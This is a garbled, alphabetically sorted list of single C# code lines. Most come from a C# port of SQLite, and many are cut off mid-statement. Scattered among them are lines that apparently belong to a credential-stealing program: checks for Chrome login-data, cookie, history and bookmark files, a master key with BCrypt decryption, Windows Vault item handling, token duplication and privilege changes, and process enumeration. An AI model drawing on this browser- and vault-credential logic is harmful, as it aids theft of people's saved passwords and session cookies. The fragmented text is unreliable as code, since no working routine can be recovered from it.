            CollSeq pColl
            CollSeq pColl = null
            CollSeq pColl = pE.pColl
            CollSeq pColl = pOp.p4.pColl
            Column pCol
            DataTable table = ExecuteQuery( query )
            DataTable table = new DataTable()
            DbPage pDbPage = new PgHdr()
            DbPage pSrcPg = null
            Debug.Assert( ( chngToIN 
            Debug.Assert( ( p.flags 
            Debug.Assert( ( pExpr.x.pList.nExpr % 2 ) == 0 )
            Debug.Assert( ( pMem.flags 
            Debug.Assert( (i64)nDestTruncate 
            Debug.Assert( /
            Debug.Assert( TK_AND == OP_And )
            Debug.Assert( TK_BITAND == OP_BitAnd )
            Debug.Assert( TK_BITNOT == OP_BitNot )
            Debug.Assert( TK_BITOR == OP_BitOr )
            Debug.Assert( TK_CONCAT == OP_Concat )
            Debug.Assert( TK_EQ == OP_Eq )
            Debug.Assert( TK_GE == OP_Ge )
            Debug.Assert( TK_GT == OP_Gt )
            Debug.Assert( TK_ISNULL == OP_IsNull )
            Debug.Assert( TK_LE == OP_Le )
            Debug.Assert( TK_LSHIFT == OP_ShiftLeft )
            Debug.Assert( TK_LT == OP_Lt )
            Debug.Assert( TK_MINUS == OP_Subtract )
            Debug.Assert( TK_NE == OP_Ne )
            Debug.Assert( TK_NOT == OP_Not )
            Debug.Assert( TK_NOTNULL == OP_NotNull )
            Debug.Assert( TK_OR == OP_Or )
            Debug.Assert( TK_PLUS == OP_Add )
            Debug.Assert( TK_REM == OP_Remainder )
            Debug.Assert( TK_RSHIFT == OP_ShiftRight )
            Debug.Assert( TK_SLASH == OP_Divide )
            Debug.Assert( bestPlan.plan.u.pIdx == pIdx )
            Debug.Assert( cc != null )
            Debug.Assert( eDest == SRT_Discard )
            Debug.Assert( eDest == SRT_Output 
            Debug.Assert( esc == 0 )
            Debug.Assert( i < nTemp )
            Debug.Assert( iDb == 1 )
            Debug.Assert( j == 1 )
            Debug.Assert( matchSet < 0x80 )
            Debug.Assert( n <= pTab.nCol )
            Debug.Assert( n >= 1 )
            Debug.Assert( nColumn == 1 )
            Debug.Assert( null == p.pFirst )
            Debug.Assert( p.aCol == null )
            Debug.Assert( p.addrOpenEphm[0] == -1 )
            Debug.Assert( p.addrOpenEphm[1] == -1 )
            Debug.Assert( p.pEList != null )
            Debug.Assert( p.pFirst != null )
            Debug.Assert( p.pOrderBy == null )
            Debug.Assert( pBt != null )
            Debug.Assert( pColl != null 
            Debug.Assert( pDef != null )
            Debug.Assert( pDest.eDest == SRT_Output )
            Debug.Assert( pExpr.op == TK_EXISTS 
            Debug.Assert( pExpr.u.zToken != null )
            Debug.Assert( pExpr.u.zToken.Length != 0 )
            Debug.Assert( pExpr.u.zToken[0] == 'x' 
            Debug.Assert( pExpr.u.zToken[1] == '
            Debug.Assert( pExpr.x.pList.nExpr > 0 )
            Debug.Assert( pFile != null )
            Debug.Assert( pIn.nMem == 1 )
            Debug.Assert( pItem.iCol > 0 )
            Debug.Assert( pLeft != null )
            Debug.Assert( pOp.p1 <= p.nMem )
            Debug.Assert( pOp.p1 > 0 
            Debug.Assert( pOp.p1 > 0 )
            Debug.Assert( pOp.p2 <= p.nMem )
            Debug.Assert( pOp.p2 > 0 )
            Debug.Assert( pOp.p3 <= p.nMem )
            Debug.Assert( pOp.p3 > 0 )
            Debug.Assert( pOrTerm.eOperator == WO_EQ )
            Debug.Assert( pOrTerm.leftCursor == iCursor )
            Debug.Assert( pOrTerm.u.leftColumn == iColumn )
            Debug.Assert( pPager.dbFileSize > 0 )
            Debug.Assert( pPager.pInJournal != null )
            Debug.Assert( pPager.pTmpSpace != null )
            Debug.Assert( pPager.state == PAGER_UNLOCK )
            Debug.Assert( pParse.apVarExpr != null )
            Debug.Assert( pParse.nTab > iCur 
            Debug.Assert( pPg.pgno != ( ( PENDING_BYTE / ( pPager.pageSize ) ) 
            Debug.Assert( pPrior.pLimit == null )
            Debug.Assert( pPrior.pOrderBy == null )
            Debug.Assert( pSelect == null )
            Debug.Assert( pTab != null 
            Debug.Assert( pTab != null )
            Debug.Assert( pTab.nCol > 0 )
            Debug.Assert( pTriggerStack.pTab != null )
            Debug.Assert( pX.pLeft != null )
            Debug.Assert( rc == 0 )
            Debug.Assert( rc == SQLITE_OK 
            Debug.Assert( sizeof( double ) == sizeof( u64 ) 
            Debug.Assert( sqlite3_value_type( argv[0] ) == SQLITE_NULL )
            Debug.Assert( to_op == OP_ToBlob 
            Debug.Assert( to_op == OP_ToInt 
            Debug.Assert( to_op == OP_ToNumeric 
            Debug.Assert( to_op == OP_ToReal 
            Debug.Assert( to_op == OP_ToText 
            Debug.Assert( unionTab == dest.iParm 
            Debug.Assert( zBlob.Length == sqlite3_value_blob( argv[0] ).Length )
            Debug.Assert( z[n] == '
            Debug.Assert((balance_deeper_called
            Debug.Assert(iFreePg == iLastPg)
            Debug.Assert(j < nOld)
            Debug.Assert(k < nNew)
            Debug.Assert(leafCorrection == 0)
            Debug.Assert(leafCorrection == 4)
            Debug.Assert(nOverflow < 2 
            Debug.Assert(nOverflow < 3 
            Debug.Assert(nOverflow > 0 
            Debug.Assert(pOld.hdrOffset == 0)
            Debug.Assert(pPgno == iTrunk)
            Debug.Assert(pPrevTrunk == null)
            Debug.Assert(yymsp[-1].minor.yy473 != null)
            Debug.Assert(yymsp[-2].minor.yy473 != null)
            Debugger.Break()
            Expr cacheX
            Expr compLeft = new Expr()
            Expr compRight = new Expr()
            Expr exprAnd = new Expr()
            Expr exprX = new Expr()
            Expr opCompare = new Expr()
            Expr p = null
            Expr p = pS.pEList.a[0].pExpr
            Expr pExpr = pTerm.pExpr
            Expr pLeft = pExpr.pLeft
            Expr pRight
            Expr pRight = pLItem.pExpr
            Expr pTerm = pOrderBy.a[i].pExpr
            Expr pTest = null
            Expr pX
            Expr pX = pTerm.pExpr
            ExprList pEList
            ExprList pFarg
            ExprList pList
            ExprList pList = pExpr.x.pList
            ExprList pMinMax = null
            ExprList_item pLItem = pExpr.x.pList.a[0]
            ExprList_item[] aListelem
            ExprSetIrreducible( pExpr )
            ExprSpan v = new ExprSpan()
            File.Delete( zConverted )
            FuncDef pDef
            FuncDef pDef = pOp.p4.pFunc
            Index pBest = null
            Index pIdx
            Int32 vaultCount = 0
            IntPtr DuplicatedToken = new IntPtr()
            IntPtr guidAddress = vaultGuidPtr
            IntPtr hAlg = IntPtr.Zero
            IntPtr hProcess = GetCurrentProcess()
            IntPtr hToken
            IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize)
            IntPtr vaultGuidPtr = IntPtr.Zero
            Key = Registry.CurrentUser
            KeyInfo keyInfo
            KeyInfo pKeyInfo = null
            KeyInfo pKeyInfo = pOp.p4.pKeyInfo
            LUID luid = new LUID()
            Last = 13
            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1)
            Marshal.FreeHGlobal(keyDataBuffer)
            Mem c1
            Mem c2
            Mem pMem = pOp.p4.pMem
            MemPage pFreePg = new MemPage()
            MemPage pMove = new MemPage()
            MemPage pPg = new MemPage()
            N -= n
            N--
            NameContext sNC = new NameContext()
            OpenDatabase( DatabaseName )
            PAGER_INCR( ref  iValue )
            Parse pParse = pWC.pParse
            Pgno iFreePg = 0
            Pgno iPage
            RegistryKey Key
            SHARED locks may be obtained by other processes.
            Select pS = null
            Select pS = pExpr.x.pSelect
            Select pSel
            SelectDest dest = new SelectDest()
            SelectDest intersectdest = new SelectDest()
            SelectDest uniondest = new SelectDest()
            SelectQuery query1 =
            StringBuilder z
            StringBuilder zText
            Synchronize = 0x00100000
            TOKEN_PRIVILEGES oldState = new TOKEN_PRIVILEGES()
            Table pTab
            Table pTab = null
            Thread.Sleep( 1 )
            Thread.Sleep( 100 )
            Token all = new Token()
            Trigger cc = pTab.pTrigger
            Type VAULT_ITEM
            VdbeOp pOp
            WhereClause pAndWC
            WhereCost sTermCost = null
            WhereTerm pAndTerm
            WhereTerm pOrTerm = pOrWc.a[ii]
            WhereTerm pOther = pOrWc.a[pOrTerm.iParent]
            [FieldOffset(0)] public VAULT_SCHEMA_ELEMENT_ID SchemaElementId
            [FieldOffset(8)] public VAULT_ELEMENT_TYPE Type
            [MarshalAs(UnmanagedType.LPWStr)]
            _n = 0
            aLen[ii] = iz1 - iz0
            aListelem = pEList.a
            aNew[ii].iOffset = (int)JOURNAL_HDR_SZ( pPager )
            aNew[ii].iOffset = pPager.journalOff
            aXRef[j] = i
            a[i] = null
            a[i] = p
            a[k].pExpr = null
            aff = sqlite3AffinityType( pExpr.u.zToken )
            affinity = comparisonAffinity( pExpr )
            affinity = sqlite3ExprAffinity( pLeft )
            all.n = (int)(yymsp[-3].minor.yy0.z.Length - yymsp[0].minor.yy0.z.Length) 
            any time. Other processes may hold and obtain new SHARED locks.
            ap = sqlite3GlobalConfig.m
            ap = sqlite3GlobalConfig.pcache
            apColl = db.pDfltColl
            apNew[h] = pPage
            ap[0] = pAccum.nChar
            assert(zType[i-1]==' ')
            attachBackupObject( p )
            attr = FileAttributes.Normal
            azChar[ii] = new byte[aLen[ii]]
            b 
            bNew = true
            bOld = true
            bestJ = j
            bestPlan = sCost
            bestScore = score
            bool is_agg = false
            bool no_such_func = false
            bool ret
            bool wrong_num_args = false
            break
            buf[0] = '%'
            buf[0] = (char)c
            bufpt = 0
            bufpt = buf.Length
            bufpt = bufStr.Length
            byte[] _pCell_4 = new byte[pCell.Length 
            byte[] aData = pTrunk.aData
            byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode)
            byte[] masterKey = new byte[] { }
            byte[] pData2 = null
            byte[] plainText
            byte[] result = new byte[len - 1 
            byte[] temp = new byte[masterKey.Length - 5]
            byte[] value = new byte[size]
            byte[] z = sqlite3_value_blob( argv[0] )
            byte[] zBlob
            byte[] zBlob = sqlite3_value_blob( argv[0] )
            c = ( c << 6 ) 
            c = fmt[
            c = sqlite3UpperToLower[c]
            c1 = new Mem()
            c2 = new Mem()
            case '
            case ' ': flag_blanksign = true
            case '!': flag_altform2 = true
            case '-': flag_leftjustify = true
            case '0': flag_zeropad = true
            case OE_Abort:
            case OE_Fail:
            case OE_Ignore:
            case OE_Replace:
            case OE_Rollback:
            catch
            catch (Exception ex)
            char affinity
            char idxaff
            char[] _bufOrd = null
            chngRowid = true
            chngToIN 
            chngToIN = 0
            clearYMD_HMS_TZ( p )
            cnt
            cntTab
            compLeft.op = TK_GE
            compLeft.pLeft = exprX
            compLeft.pRight = pExpr.x.pList.a[0].pExpr
            compRight.op = TK_LE
            compRight.pLeft = exprX
            compRight.pRight = pExpr.x.pList.a[1].pExpr
            computeJD( p )
            computeYMD( p )
            const double r1 = 1.0
            const u64 t1 = ( (u64)0x3ff00000 ) << 32
            continue
            cost 
            cost /= 2
            cost /= 3
            cp.n = 0
            db = null
            db.autoCommit = 1
            db.nextPagesize = atoi( zRight )
            dbFileVers = new byte[dbFileVers.Length]
            default:
            default: done = true
            dist = 0
            do
            doesStatementRollback = true
            double d = 0
            double rRounder
            double rVal = sqlite3_value_double( argv[0] )
            eStatementOp = SAVEPOINT_RELEASE
            eStatementOp = SAVEPOINT_ROLLBACK
            eType = IN_INDEX_ROWID
            else
            else Debugger.Break()
            else if ( ( opProperty 
            else if ( ( pMem.flags 
            else if ( ALWAYS( pTab.pSchema ) )
            else if ( c != 0 )
            else if ( c == '<' )
            else if ( c == '>' )
            else if ( eDest == SRT_Coroutine )
            else if ( n == 4 
            else if ( n == 5 
            else if ( n == 6 
            else if ( no_such_func )
            else if ( pAggInfo.useSortingIdx != 0 )
            else if ( pExpr.x.pList != null )
            else if ( pLeft.op == TK_INTEGER )
            else if ( pOp.opcode == OP_NullRow 
            else if ( pOp.opcode == OP_Rowid )
            else if ( pOrTerm.leftCursor == iCur )
            else if ( pOrTerm.u.leftColumn != iColumn )
            else if ( rc != SQLITE_INTERRUPT 
            else if ( rc != SQLITE_OK )
            else if ( wrong_num_args )
            else if ( xtype == etDYNSTRING )
            else if (0 == (pPage.aData[pCell 
            else if (nCellKey < intKey)
            else return (string)ap[vaNEXT - 1]
            endLabel = sqlite3VdbeMakeLabel( v )
            esign = -1
            eval = eval 
            exp = 0
            exprAnd.op = TK_AND
            exprAnd.pLeft = compLeft
            exprAnd.pRight = compRight
            exprX = pExpr.pLeft
            exprX = pExpr.pLeft.Copy()
            exprX.op = TK_REGISTER
            fire_this = true
            flag_dp = ( precision > 0 
            flag_exp = xtype == etEXP
            flag_leftjustify = true
            flag_long = false
            flag_longlong = false
            flag_longlong = true
            for ( 
            for ( e2
            for ( i = 0 
            for ( i = 1 
            for ( iCol = 0 
            for ( idx = precision - length 
            for ( int i = 0 
            for ( j = 0 
            for ( pIdx = pTab.pIndex 
            for (i = 0
            for (int i = 0
            for (int i = 1
            for (j = pc 
            foreach ( DataRow row in table.Rows )
            foreach (Process p in Process.GetProcesses())
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            foreach (byte[] array in arrays)
            foreach (string url in urls)
            foreach (string url_file_path in files)
            fs.Close()
            goto case '0'
            goto case ':'
            goto case TK_IN
            goto case etRADIX
            goto default
            goto end_allocate_page
            goto end_playback
            goto end_prepare
            goto exit_create_index
            goto failed
            goto fk_end
            goto initone_error_out
            goto insert_cleanup
            goto update_cleanup
            goto whereBeginError
            groupBySort = 0
            groupBySort = 1
            i
            i = (int)sqlite3Get4byte(pOvflData)
            i = sqlite3Strlen30( zTemp )
            i64 iNewSum = p.iSum 
            i64 iNextHdrOffset
            i64 iVal = sqlite3_value_int64( argv[0] )
            i64 nCellKey = 0
            i64 v = sqlite3_value_int64( argv[0] )
            iBreak = sqlite3VdbeMakeLabel( v )
            iCol >= 0 
            iColumn = -1
            iColumn = pOrTerm.u.leftColumn
            iCont = sqlite3VdbeMakeLabel( v )
            iCursor = pOrTerm.leftCursor
            iDb = 1
            iLargest = iIdx
            iNextHdrOffset = journalHdrOffset( pPager )
            iSum = 0
            iValue = sqlite3_pager_writej_count.iValue
            idxaff = pIdx.pTable.aCol[iColumn].affinity
            if ( !( ( ( c = (byte)z[iOffset 
            if ( !IsVirtual( pTab ) )
            if ( !isRowid )
            if ( !needSync 
            if ( !pPager.journalStarted 
            if ( !pPager.noSync )
            if ( !sqlite3Isdigit( z[iOffset 
            if ( ( c = (byte)z[iOffset 
            if ( ( chngToIN 
            if ( ( iOffset 
            if ( ( infop.flags 
            if ( ( mask 
            if ( ( mrc == SQLITE_NOMEM 
            if ( ( opProperty 
            if ( ( pDef.flags 
            if ( ( pIdx.aiColumn[0] == iCol )
            if ( ( pItem.pExpr.flags 
            if ( ( pMem.flags 
            if ( ( pOrTerm.wtFlags 
            if ( ( pPage.flags 
            if ( ( pTerm.flags 
            if ( ( pValue.flags 
            if ( ( pX = pExpr.pLeft ) != null )
            if ( ( resultType = CSSQLite.sqlite3_step( vm) ) == CSSQLite.SQLITE_ROW )
            if ( ( serial_type 
            if ( 0 == ( cntTab
            if ( 0 == callbackIsInit )
            if ( ALWAYS( pBt ) )
            if ( ALWAYS( pOp != null ) 
            if ( ALWAYS( pSrcList != null ) )
            if ( ALWAYS( zSpan ) )
            if ( Double.IsNaN( realvalue ) 
            if ( IsHiddenColumn( pTab.aCol[i] ) )
            if ( aXRef[pIdx.aiColumn[i]] >= 0 )
            if ( addr != 0 )
            if ( addr < 0 )
            if ( aiValues[j] != 0 ) rc 
            if ( bNew ) pTriggerStack.newColMask = piColMask
            if ( bOld ) pTriggerStack.oldColMask = piColMask
            if ( bufStr.Length > buf.Length ) buf = new char[bufStr.Length]
            if ( bufpt == 0 )
            if ( c != 0 ) i
            if ( c < 0x80 ) c = sqlite3UpperToLower[c]
            if ( c == '
            if ( c == 'A' - 1 ) isComplete = false
            if ( c == ']' ) seen = 1
            if ( c == 0 )
            if ( c == matchOne 
            if ( c2 < 0x80 ) c2 = sqlite3UpperToLower[c2]
            if ( c2 == '-' 
            if ( c2 == 0 ) return false
            if ( columnCount == 0 )
            if ( db != null )
            if ( db.errCode != CSSQLite.SQLITE_OK )
            if ( db.init.busy == 0 )
            if ( dequote != 0 
            if ( dest.eDest != priorOp )
            if ( dest.eDest == SRT_Output )
            if ( dest.eDest == priorOp 
            if ( e2 < 0 )
            if ( eDest == SRT_Output )
            if ( eOp == SAVEPOINT_ROLLBACK )
            if ( eType == IN_INDEX_ROWID )
            if ( flag != 0 )
            if ( flag_alternateform 
            if ( flag_dp )
            if ( flag_exp 
            if ( flag_rtz 
            if ( flag_zeropad 
            if ( groupBySort != 0 )
            if ( i > 1 )
            if ( i >= nChar ) break
            if ( iCol < 0 ) iCol = pTab.iPKey
            if ( iCol <= 0 
            if ( iCol == 0 )
            if ( iOffset 
            if ( iVal < 0 )
            if ( idxNew == 0 ) return
            if ( inReg != target )
            if ( is_agg 
            if ( is_agg )
            if ( is_agg ) pNC.allowAgg = 0
            if ( is_agg ) pNC.allowAgg = 1
            if ( j < 0 )
            if ( j == iFrom ) iFrom
            if ( j == pTab.iPKey )
            if ( longvalue == 0 ) flag_alternateform = false
            if ( n == 0 ) tokenType = TK_ILLEGAL
            if ( n == 3 
            if ( n > 10 
            if ( n > z.Length ) cp.n = z.Length
            if ( nDestTruncate == (int)PENDING_BYTE_PAGE( p.pDest.pBt ) )
            if ( nFarg != 0 )
            if ( nPage == 0 )
            if ( nSignificant < 18 )
            if ( newVal != 0 )
            if ( noCase )
            if ( null == zRight )
            if ( p.enc == pColl.enc )
            if ( p.iLimit != 0 )
            if ( p.op == TK_EXCEPT )
            if ( p.pLeft.op == TK_FLOAT 
            if ( p.pOrderBy.a[ii].iCol == 0 ) return 0
            if ( pAggInfo.directMode == 0 )
            if ( pBest != null 
            if ( pCache.apHash[h] == pPage )
            if ( pColl != null 
            if ( pDef == null )
            if ( pDest.iMem == 0 )
            if ( pE == null ) return 1
            if ( pE.op == TK_DOT )
            if ( pExpr.affinity != OE_Ignore )
            if ( pExpr.iTable < 0 )
            if ( pExpr.op == TK_SELECT )
            if ( pExpr.pRight != null )
            if ( pExpr.u.zToken.Length == 1
            if ( pFarg != null )
            if ( pIdx.aiColumn[k] != pIndex.aiColumn[k] ) break
            if ( pIdx.onError != pIndex.onError )
            if ( pIdx.onError == OE_Replace )
            if ( pInfo == null )
            if ( pInfo.needToFreeIdxStr != 0 )
            if ( pItem.iCol == i ) break
            if ( pItem.zName != null ) pParse.zAuthContext = pItem.zName
            if ( pKeyInfo != null )
            if ( pLeft.op == TK_FLOAT )
            if ( pList != null )
            if ( pMinMax == null 
            if ( pNC.isCheck != 0 )
            if ( pNC.nDepth == 0 )
            if ( pNew != null )
            if ( pNew == null ) return SQLITE_NOMEM
            if ( pOp.opcode == OP_Column )
            if ( pOp.p1 != pLevel.iTabCur ) continue
            if ( pOp.p4.z != null ) zTemp.Append( pOp.p4.z )
            if ( pOrTerm.eOperator == WO_AND )
            if ( pOrTerm.leftCursor != iCursor )
            if ( pOrTerm.leftCursor == iCur 
            if ( pOrTerm.leftCursor == iCursor )
            if ( pOrderBy != null )
            if ( pPage != null )
            if ( pPager.dbFileVers[i] != dbFileVers[i] )
            if ( pPager.fullSync 
            if ( pPager.sectorSize > SQLITE_MAX_DEFAULT_PAGE_SIZE )
            if ( pParse.nErr != 0 /
            if ( pParse.trigStack == null )
            if ( pRight.op == TK_ID )
            if ( pS != null )
            if ( pSelTab == null ) return
            if ( pTab != null )
            if ( pTab == null )
            if ( pTabList.a[j].iCursor == p.iTable ) break
            if ( pWInfo == null )
            if ( pg != ( ( PENDING_BYTE / ( pPager.pageSize ) ) 
            if ( prc != 0 )
            if ( precision < 0 ) precision = -precision
            if ( precision < 0 ) precision = 6
            if ( precision > etBUFSIZE / 2 - 10 ) precision = etBUFSIZE / 2 - 10
            if ( precision >= 0 )
            if ( prefix != '
            if ( pzBuffer != null )
            if ( rMayHaveNull != 0 )
            if ( rTotal >= pCost.rCost ) break
            if ( rVal < 0 ) rVal = -rVal
            if ( rc != 0 )
            if ( rc != SQLITE_OK 
            if ( rc != SQLITE_OK )
            if ( rc != SQLITE_OK ) return rc
            if ( rc != SQLITE_SCHEMA )
            if ( rc == SQLITE_BUSY )
            if ( rc == SQLITE_DONE )
            if ( rc == SQLITE_NOMEM )
            if ( rc == SQLITE_OK 
            if ( rc == SQLITE_OK )
            if ( rc == SQLITE_ROW )
            if ( rc2 == SQLITE_OK )
            if ( realvalue < 0.0 )
            if ( realvalue > 0.0 )
            if ( resetFlag != 0 )
            if ( rev != 0 )
            if ( serial_type == 6 )
            if ( sqlite3GlobalConfig.pcache.xInit == null )
            if ( sqlite3IsRowid( pColumn.a[i].zName ) )
            if ( sqlite3SafetyOff( db ) ) goto abort_due_to_misuse
            if ( sqlite3SafetyOn( db ) ) goto abort_due_to_misuse
            if ( tableSeen == 0 )
            if ( tnum == pIndex.tnum )
            if ( useExtended != 0 
            if ( v == 40 
            if ( wsFlags == 0 )
            if ( x < BMS - 1 )
            if ( xtype != etFLOAT )
            if ( xtype == etEXP )
            if ( xtype == etFLOAT ) realvalue 
            if ( xtype == etGENERIC 
            if ( xtype == etGENERIC )
            if ( xtype == etORDINAL )
            if ( z != null )
            if ( z == null ) return
            if ( z.Length <= 9 ) z.Length = 0
            if ( z.Length > iOffset 
            if ( z1 != z2 
            if ( zArg == null 
            if ( zAs != null 
            if ( zFile[0] == 0 ) continue
            if ( zRight != null )
            if ( zTab != null )
            if ( zText != null )
            if ( z[iOffset 
            if ( z[n - 1] == 's' ) { z.Length = --n
            if ( z[n] == ':' )
            if ((int)result != 0)
            if (0 == (nCell 
            if (0 == searchList 
            if (ALWAYS(yygotominor.yy65 != null 
            if (File.Exists(chrome_History_path) == true)
            if (File.Exists(chrome_book_path) == true)
            if (File.Exists(chrome_cookie_path) == true)
            if (File.Exists(filePath) == false)
            if (File.Exists(login_data_path) == true)
            if (OSMajor >= 6 
            if (hProcess == IntPtr.Zero) return false
            if (i == cntNew[k])
            if (i == iOverflow)
            if (iPage > mxPage)
            if (info.iOverflow != 0)
            if (isDivider != 0 
            if (j >= 0 
            if (k == 0)
            if (nCellKey == intKey)
            if (nearby > 0)
            if (p != null)
            if (pCur.iPage == 0)
            if (pPage != null)
            if (pPage.hasData != 0
            if (pPage.hasData != 0)
            if (pPage.intKey != 0 
            if (pParse.nested == 0)
            if (pc 
            if (pc < iCellFirst 
            if (rc != 0)
            if (rc != SQLITE_OK)
            if (rc == SQLITE_OK)
            if (status != BCrypt.ERROR_SUCCESS)
            if (szCell[j] == 4)
            if (szCell[nCell] < 4)
            if (x < 4)
            if (yyTraceFILE != null)
            if (yygotominor.yy14 != null 
            if (yygotominor.yy14 != null) yygotominor.yy14.a[yygotominor.yy14.nExpr - 1].sortOrder = (u8)yymsp[0].minor.yy328
            if (yygotominor.yy346.pExpr != null)
            if (yygotominor.yy346.pExpr != null) yygotominor.yy346.pExpr.flags 
            if (yymsp[-1].minor.yy0.n > 0)
            if (yymsp[-1].minor.yy14 != null 
            if (yymsp[-2].minor.yy328 != 0 
            if (yymsp[-6].minor.yy65 == null 
            if (yymsp[0].minor.yy3 != null)
            if (yymsp[0].minor.yy346.pExpr != null)
            inReg = pExpr.iColumn
            inReg = pExpr.iTable
            inReg = target
            inTrans = 1
            indexable 
            infop = fmtinfo[idx]
            int a = (int)amt
            int addr
            int addr = 0
            int addr = pLoop.addrOpenEphm[i]
            int auth
            int c
            int columnCount = CSSQLite.sqlite3_column_count( vm )
            int columnCount = table.Columns.Count
            int columnType = 0
            int constMask = 0
            int d2 = sqlite3VdbeMakeLabel( v )
            int delim = z[iOffset 
            int eType
            int endLabel
            int flag = minMaxQuery( p )
            int flags = pE.flags 
            int i
            int iCacheLevel = pParse.iCacheLevel
            int iCol
            int iCol = pColExpr.iColumn
            int iCol = pExpr.iColumn
            int iCsr = pParse.nTab
            int iDb
            int iRoot = pTab.tnum
            int iValue
            int idxNew
            int isDivider = 0
            int iz = 0
            int j
            int j = i - iLookAhead 
            int j1
            int len = (int)( ( serial_type - 12 ) / 2 )
            int len = 0
            int n
            int n = 0
            int n = pList != null 
            int nBlob = sqlite3_value_bytes( argv[0] )
            int nCell = pPage.aData[pCell 
            int nCol
            int nExpr
            int nFarg
            int nGroupBy
            int nId
            int nSize = exprStructSize( p )
            int newMax = 0
            int nextCase
            int offset = 0
            int prc
            int priorOp
            int r1
            int r1 = sqlite3GetTempReg( pParse )
            int r2 = sqlite3GetTempReg( pParse )
            int rMayHaveNull = 0
            int rNotFound = 0
            int ratio = nDestPagesize / nSrcPagesize
            int regBase
            int regRecord
            int res = 0
            int resultType
            int s1 = (int)( p.iSum >> ( sizeof( i64 ) 
            int s2 = (int)( v >> ( sizeof( i64 ) 
            int s3 = (int)( iNewSum >> ( sizeof( i64 ) 
            int size = 0
            int size = ALWAYS( pBt ) 
            int tableSeen = 0
            int unionTab
            int v = 0
            int x = 0
            int x = pProbe.aiColumn[j]
            int x = size - nByte
            intersectdest.iParm = tab2
            invalidateCursorsOnModifiedBtrees( db )
            invert = 1
            isAgg = true
            iz0 = iz1
            izIn 
            j = -1
            j = i
            j = nGroupBy 
            j--
            jointype 
            keyInfo = new KeyInfo()
            keyInfo.nField = 1
            len = ( zCsr == zSql.Length ) 
            len = (u32)nBuf
            len = 0
            length = 1
            length = buf.Length - bufpt
            length = bufpt
            length = width = 0
            list.Add( row.ItemArray[0].ToString() )
            lwr = idx 
            maxRootPgno--
            minI = j
            minV = (int)apNew[j].pgno
            moreToDo = 1
            moveToParent(pCur)
            ms = ms 
            n = sqlite3Strlen30( z )
            n = sqlite3Strlen30( z ) - 1
            n1 = v1 == null 
            n2 = v2 == null 
            nCol = nGroupBy 
            nDestTruncate = ( nSrcPage 
            nDestTruncate = nSrcPage 
            nDestTruncate == (int)( PENDING_BYTE_PAGE( p.pDest.pBt ) - 1 )
            nExpr = pEList.nExpr
            nExtra 
            nFarg = pFarg != null 
            nGroupBy = pGroupBy.nExpr
            nId = sqlite3Strlen30( zId )
            nIn -= len
            nNew = sqlite3MallocSize( pNew )
            nPage
            nProgressOps = 0
            nQPlan 
            nRow 
            nSep = 1
            nSep = sqlite3_value_bytes( argv[1] )
            nToken = 0
            nToken = sqlite3Strlen30( p.u.zToken )
            needPagerReset = 0
            next = iGuess
            nsd = 0
            object GetVaultElementValue(IntPtr vaultElementPtr)
            object[] columnValues = new object[columnCount]
            offset 
            offset -= ovflSize
            onError   pTabList      pChanges             pWhere
            once = 1
            out bool pfResult
            p = pNext
            p.aCol = pSelTab.aCol
            p.aMem[n].db = db
            p.aMem[n].flags = MEM_Null
            p.aMem[n].n = 0
            p.aMem[n].z = null
            p.aMem[n].zBLOB = null
            p.aVar[n].db = db
            p.aVar[n].flags = MEM_Null
            p.addrOpenEphm[0] = addr
            p.addrOpenEphm[1] = addr
            p.affinity =
            p.approx = true
            p.azVar[pOp.p1 - 1] = pOp.p4.z != null 
            p.h = p.m = 0
            p.iLimit = 0
            p.iLimit = pPrior.iLimit
            p.iOffset = 0
            p.iOffset = pPrior.iOffset
            p.iSum = iNewSum
            p.nCol = pSelTab.nCol
            p.nSet
            p.overflow = ( ( s1 
            p.pFirst = pNew
            p.pLimit = null
            p.pLimit = pLimit
            p.pNext = pIndex.pNext
            p.pOffset = null
            p.pOffset = pOffset
            p.pOrderBy = null
            p.pPrior = null
            p.pPrior = pPrior
            p.pRightmost.selFlags 
            p.rSum 
            p.rc = rc
            p.s = 0.0
            p.selFlags 
            p.tempReg = 1
            p.u.aHash[h] = aiValues[j]
            p.validHMS = 1
            p.validJD = 0
            p.validTZ = 0
            p.zBLOB = new byte[p.z.Length]
            p.zErrMsg = null
            pAndWC = pAndInfo.wc
            pArg = ( (sqlite3_file)id ).locktype
            pArg = (int)( (sqlite3_file)id ).lastErrno
            pAux.xDelete( ref pAux.pAux )
            pBest = p
            pBt.autoVacuum = (SQLITE_DEFAULT_AUTOVACUUM != 0)
            pBt.inTransaction = TRANS_NONE
            pBt.incrVacuum = (SQLITE_DEFAULT_AUTOVACUUM == 2)
            pCache.nPage--
            pCell = _pCell_4
            pCell = pTemp
            pChunk.pNext = pNew
            pColl = db.pDfltColl
            pColl = null
            pColl = pParse.db.pDfltColl
            pColl[j].xDel( ref  pColl[j].pUser )
            pCons = pEnd
            pCost.nRow = 1
            pCost.nRow = 100
            pCost.nRow = nRow
            pCost.plan.nEq = 1
            pCost.plan.u.pTerm = pTerm
            pCost.plan.wsFlags = (uint)flags
            pCost.plan.wsFlags = WHERE_ROWID_EQ 
            pCost.rCost 
            pCost.rCost = 0
            pCost.rCost = 200
            pCost.rCost = pCost.nRow = pExpr.x.pList.nExpr
            pCost.rCost = rTotal
            pCur.eState = CURSOR_INVALID
            pCur.info.nKey = nCellKey
            pCur.validNKey = true
            pCurrent = db.lookaside.nOut
            pData.rc = rc
            pDb.pSchema = null
            pDb.zName
            pDel = null
            pDelete = p.pPrior
            pDup = pExpr
            pE.flags = (u16)( pE.flags 
            pE.pColl = pColl
            pE.u.iValue = iCol
            pEList = pExpr.x.pList
            pExpr.iColumn = (short)dest.iParm
            pExpr.iTable = pE.iTable
            pExpr.iTable = pParse.nTab
            pExpr.iTable = pTriggerStack.newIdx
            pExpr.iTable = pTriggerStack.oldIdx
            pExpr.pColl = pColl
            pFromCol.a[i].zName )
            pFunc.iDistinct = -1
            pGroupBy = p.pGroupBy
            pHighwater = db.lookaside.mxOut
            pIdx = pc 
            pIdx.azColl[0] = p.aCol[i].zColl
            pIn = pLevel.u._in.aInLoop[j - 1]
            pIn1 = p.aMem[pOp.p1]
            pIn2 = p.aMem[pOp.p2]
            pIn3 = p.aMem[pOp.p3]
            pItem = p.pEList.a[p.pEList.nExpr - k]
            pItem = pGroupBy.a[i]
            pItem = pGroupBy.a[pGroupBy.nExpr - k]
            pItem = pList.a[j]
            pItem = pOrderBy.a[j]
